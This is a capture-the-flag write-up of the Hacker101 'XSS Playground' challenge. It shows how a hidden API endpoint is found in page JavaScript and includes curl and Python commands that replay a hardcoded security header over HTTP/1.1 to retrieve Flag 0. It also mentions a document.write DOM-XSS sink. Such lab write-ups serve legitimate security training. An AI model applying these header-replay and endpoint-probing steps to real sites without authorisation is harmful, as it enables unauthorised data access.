# XSS Playground by zseano

**Platform:** HackerOne CTF (Hacker101)
**Challenge:** XSS Playground by zseano
**Difficulty:** Moderate
**Category:** Web
**Flags:** 1 (captured so far)

---

## Overview

This challenge presents a social-media-style profile page for "zseano" loaded with intentional XSS vulnerabilities. The page challenges you to find 5 Reflected XSS, 3 Stored XSS, 2 DOM-Based XSS, 1 CSP-Bypass XSS, and 1 use of XSS to leak "something".

The first flag is found not through XSS directly but by discovering a case-sensitive security header check in an API endpoint hidden in the page's JavaScript.

**Hints provided:**
- "Flag0 -- Not Found" (no hints unlocked)

**Server:** Apache/2.4.38 (Debian), PHP/7.2.34, openresty/1.29.2.4

---

## Reconnaissance

### Application Behavior

The page is a static-looking profile page with several interactive features:
- Feedback modal (sends feedback to `/api/feedback.php`)
- Report user modal (sends reports to `/api/action.php?act=report`)
- Comment form (posts to `/api/action.php?act=comment`)
- Search feature (disabled in UI)
- Restart session link (`logout.php`)

| Page/Endpoint | Method | Purpose |
|---------------|--------|---------|
| `/index.php` | GET | Main profile page |
| `/index.php?msg=` | GET | Displays alert with message (HTML-encoded) |
| `/api/action.php?act=getemail` | GET | Retrieves email + flag (auth required) |
| `/api/action.php?act=editbio` | POST | Updates bio (auth required) |
| `/api/action.php?act=report` | POST | Submits user report |
| `/api/action.php?act=comment` | POST | Posts a comment |
| `/api/feedback.php` | POST | Submits feedback |

### Key Findings

1. **JavaScript reveals hidden API:** The `custom.js` file contains a `retrieveEmail()` function that calls `/api/action.php?act=getemail` with an `X-SAFEPROTECTION` header set to `enNlYW5vb2Zjb3Vyc2U=` (base64 for `zseanoofcourse`).

2. **Case-sensitive header validation:** The server validates the exact casing of the `X-SAFEPROTECTION` header. HTTP/2 (default in modern `curl`) normalizes all header names to lowercase, causing `X-SAFEPROTECTION` to become `x-safeprotection` and fail validation.

3. **The `msg` parameter is HTML-encoded:** The `?msg=` query parameter is reflected in the page but properly HTML-encoded, preventing direct reflected XSS.

4. **DOM-based XSS via hash:** The `custom.js` parses `window.location.hash` and writes the `who` parameter using `document.write()` when it contains "zsh1".

5. **`helper.php` echoes version:** The `helper.php?v=X.X.X` endpoint simply echoes back whatever version number is provided.

---

## Flag 0 — Case-Sensitive Security Header Bypass

**Method:** Exploit HTTP protocol behavior to bypass case-sensitive header validation on a hidden API endpoint.

### Vulnerability

The `custom.js` file defines a `retrieveEmail()` function:

```javascript
function retrieveEmail(e) {
    var t = new XMLHttpRequest;
    t.open("GET", "api/action.php?act=getemail", !0),
    t.setRequestHeader("X-SAFEPROTECTION", "enNlYW5vb2Zjb3Vyc2U="),
    t.onreadystatechange = function() {
        this.readyState === XMLHttpRequest.DONE && this.status
    },
    t.send()
}
```

This endpoint returns a JSON object containing the email and the flag — but only when the `X-SAFEPROTECTION` header is present with the exact base64 value `enNlYW5vb2Zjb3Vyc2U=` (decodes to `zseanoofcourse`).

The server performs a **case-sensitive** comparison on the header name. HTTP/2 (RFC 7540) mandates that header names be treated as lowercase, so when using HTTP/2 (the default in most modern HTTP clients), the header `X-SAFEPROTECTION` becomes `x-safeprotection` and the server rejects it with an empty response.

### Exploit

To retrieve the flag, the request must be sent over **HTTP/1.1**, which preserves the original header casing.

```bash
# cURL with --http1.1 flag (forces HTTP/1.1):
curl --http1.1 \
  -H "X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=" \
  "https://<instance>.ctf.hacker101.com/api/action.php?act=getemail"
```

Python's `requests` library preserves header casing by default, so this also works:

```python
import requests

r = requests.get(
    "https://<instance>.ctf.hacker101.com/api/action.php?act=getemail",
    headers={"X-SAFEPROTECTION": "enNlYW5vb2Zjb3Vyc2U="}
)
print(r.text)
# {'email':'zseano@ofcourse.com','flag':'^FLAG^<flag_hex>$'}
```

**Response:**
```json
{"email":"zseano@ofcourse.com","flag":"^FLAG^<redacted>$"}
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Never assume HTTP/2 header normalization is safe. Server-side header checks should always use case-insensitive comparison (`strcasecmp` or equivalent). This type of bug is particularly sneaky because it works in browsers (XMLHttpRequest preserves casing) but fails in security testing tools that use HTTP/2 by default.

---

## Complete Flag List

| Flag | Hex | Technique |
|:----:|-----|-----------|
| 0 | `<redacted>` | Case-sensitive security header bypass via HTTP/1.1 |

---

## Key Takeaways

1. **HTTP protocol version matters:** HTTP/2 normalizes header names to lowercase, while HTTP/1.1 preserves casing. Case-sensitive header checks fail silently under HTTP/2.
2. **Read JavaScript files carefully:** The `retrieveEmail()` function was hidden in `custom.js` alongside legitimate UI functions — always grep JS for API endpoints and auth headers.
3. **Base64 is not encryption:** The `X-SAFEPROTECTION` value `enNlYW5vb2Zjb3Vyc2U=` trivially decodes to `zseanoofcourse` — never rely on base64 for security.
4. **Browser vs tool behavior differs:** XMLHttpRequest in browsers preserves header casing, so the endpoint works in the UI but fails in CLI tools using HTTP/2.

---

## Files

| File | Description |
|------|-------------|
| `solve.py` | Complete PoC — captures Flag 0 via the getemail endpoint |

## Usage

```bash
pip install requests
python3 solve.py https://<instance-id>.ctf.hacker101.com/
```

---

## References

- [GitHub writeup (DivyanshuProjects)](https://github.com/DivyanshuProjects/CTF-Writeups-Hacker-101/blob/main/XSS%20Playground%20by%20zseano%20-%20%09Web%20(%20hacker101%20ctf%20).md)
- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [RFC 7540 — HTTP/2 Header Compression](https://tools.ietf.org/html/rfc7540)
